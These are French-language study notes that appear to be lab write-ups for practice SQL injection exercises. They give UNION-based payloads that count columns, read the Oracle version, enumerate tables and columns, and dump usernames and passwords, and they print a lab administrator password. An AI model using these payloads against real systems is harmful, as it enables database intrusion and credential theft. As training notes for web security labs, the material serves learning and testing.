## Lab 3

Dans le lab, c'est le paramètres `category` qui est vulnérable à l'injection. On va donc ajouter le payload suivant:
 ```
 ' UNION SELECT 'abc','def' FROM dual--
 ```
-  `dual` est une **table spéciale en Oracle** (et reconnue dans MySQL aussi)
- `'abc','def'`: chaîne arbitraire
- Dans les bases de données **Oracle**, il faut spécifier une table à partir de laquelle nous extrayons les donnés, c'est la table **dual**
- `--`: commentaire de fermeture 

Si le résultat est comme dans la capture d'écran suivante, ça a marché:

![[union_attack1.png]]

Maintenant nous allons voir la version de la base de donnée avec le payload:

```
UNION SELECT banner FROM v$version--
```



## LAB 5

Déterminez le nombre de colonnes renvoyées par la requête et identifiez celles qui contiennent des données textuelles. Vérifiez que la requête renvoie bien deux colonnes contenant du texte, en utilisant une charge utile similaire à celle du paramètre « category » :

```
'+UNION+SELECT+'abc','def'--
```

Pour afficher la liste des tables dans la base

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

Maintenant il s'agit de trouver la table qui contient la liste des username et mdp

```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_vqcbsa'--
```

On va maintenat les lister:

```
'+UNION+SELECT+username_lxlseq,+password_jidlio+FROM+users_vqcbsa--
```

On obtient:

```
administrator
1ftkcad7rcjqaoiczzjm
```


## Lab 6: Lister les contenus de la bdd Oracle

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

- Lister les tables dans la base de données

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

- Afficher les colonnes  de la table:

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

 - Afficher les utilisateurs avec leurs mdp

```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```



